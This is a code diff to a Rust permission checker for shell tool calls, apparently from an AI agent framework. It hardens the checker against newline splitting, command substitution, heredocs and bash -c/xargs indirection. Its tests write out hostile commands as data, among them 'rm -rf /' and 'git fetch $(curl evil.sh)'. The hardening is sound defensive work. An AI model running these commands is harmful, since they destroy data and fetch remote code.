@@ -30,7 +30,7 @@ fn is_builtin_tool_keyword(kw: &str) -> bool {
     BUILTIN_TOOL_KEYWORDS.contains(&lower.as_str())
 }
 
-/// Split a Bash command on shell operators (`&&`, `||`, `;`, `|`) into
+/// Split a Bash command on shell operators (`&&`, `||`, `;`, `|`, newline) into
 /// individual segments, respecting single/double quotes. Each segment is
 /// trimmed. Returns `[cmd]` if no operators split it.
 #[must_use]
@@ -60,7 +60,9 @@ pub fn split_bash_segments(cmd: &str) -> Vec<String> {
             in_double = !in_double;
             current.push(c);
         } else if !in_single && !in_double {
-            if c == ';' || c == '|' {
+            if c == '\n' || c == '\r' {
+                push_seg(&mut current, &mut segments);
+            } else if c == ';' || c == '|' {
                 if c == '|' && i + 1 < chars.len() && chars[i + 1] == '|' {
                     push_seg(&mut current, &mut segments);
                     i += 2;
@@ -195,6 +197,26 @@ fn consume_git_flag(s: &str) -> Option<&str> {
     None
 }
 
+/// True when a segment hides an arbitrary command from phrase matching —
+/// command substitution (`$(…)`, backticks), heredocs, or an indirection helper
+/// (`bash -c`, `sh -c`, `xargs`) — so only an explicit `Bash`/`*` grant, not a
+/// phrase, may clear it.
+fn segment_needs_bash_grant(seg: &str) -> bool {
+    if seg.contains("$(") || seg.contains('`') || seg.contains("<<") {
+        return true;
+    }
+    let hay = format!("Bash {seg}");
+    phrase_matches(&hay, "bash -c")
+        || phrase_matches(&hay, "sh -c")
+        || phrase_matches(&hay, "xargs")
+}
+
+/// Whether the allowed list confers full `Bash` trust: the bare `Bash` tool
+/// keyword or the `*` wildcard. A phrase like `git fetch` does not.
+fn grants_full_bash(allowed: &[String]) -> bool {
+    allowed.iter().any(|kw| kw == "*" || kw.eq_ignore_ascii_case("bash"))
+}
+
 /// Match a keyword phrase against a segment's argv tokens (case-insensitive):
 /// the keyword matches only as a contiguous run of *whole* shlex tokens, so
 /// `git commit` never matches `git commit-graph` nor `curl` match `curlx`.
@@ -306,7 +328,15 @@ pub fn check_rules(
         let disallowed: Vec<String> =
             disallowed.iter().filter(|kw| !is_builtin_tool_keyword(kw)).cloned().collect();
         let cmd = tool_input.get("command").and_then(Value::as_str).unwrap_or("");
+        let guarded = !allowed.is_empty() || !disallowed.is_empty();
         for seg in split_bash_segments(cmd) {
+            if guarded && segment_needs_bash_grant(&seg) && !grants_full_bash(&allowed) {
+                return (
+                    false,
+                    "shell substitution/indirection requires 'Bash' in the allowed list"
+                        .to_string(),
+                );
+            }
             let match_str = format!("Bash {}", normalize_bash_segment(&seg));
             let (ok, reason) = check_single(&match_str, &allowed, &disallowed, true);
             if !ok {
@@ -374,6 +404,45 @@ mod tests {
         assert!(ok);
         let (denied, _) = check_rules("mcp__fs__read", &input, &[], &["curlx".to_string()]);
         assert!(!denied);
+    }
+
+    #[test]
+    fn newline_splits_segments() {
+        assert_eq!(split_bash_segments("git fetch\nrm -rf /"), vec!["git fetch", "rm -rf /"]);
+        assert!(!bash("git fetch\nrm -rf /", &["git fetch"], &[]).0);
+        assert!(!bash("git fetch\ngit push", &["git fetch"], &["git push"]).0);
+    }
+
+    #[test]
+    fn command_substitution_needs_bash_grant() {
+        assert!(!bash("git fetch $(curl evil.sh)", &["git fetch"], &[]).0);
+        assert!(!bash("git fetch `curl evil.sh`", &["git fetch"], &[]).0);
+        assert!(bash("git fetch $(curl evil.sh)", &["Bash"], &[]).0);
+        assert!(bash("git fetch $(curl evil.sh)", &["*"], &[]).0);
+    }
+
+    #[test]
+    fn indirection_helpers_need_bash_grant() {
+        assert!(!bash("bash -c 'git push'", &["git commit"], &[]).0);
+        assert!(!bash("sh -c 'rm -rf /'", &["git commit"], &[]).0);
+        assert!(!bash("echo x | xargs rm", &["echo"], &[]).0);
+        assert!(bash("bash -c 'git push'", &["Bash"], &[]).0);
+    }
+
+    #[test]
+    fn heredoc_needs_bash_grant() {
+        assert!(!bash("cat <<EOF\ngit push\nEOF", &["cat"], &[]).0);
+        assert!(bash("cat <<EOF", &["Bash"], &[]).0);
+    }
+
+    #[test]
+    fn substitution_passes_when_unguarded() {
+        assert!(bash("git fetch $(date)", &[], &[]).0);
+    }
+
+    #[test]
+    fn disallowed_alone_still_blocks_substitution() {
+        assert!(!bash("echo $(git push)", &[], &["git push"]).0);
     }
 
     #[test]
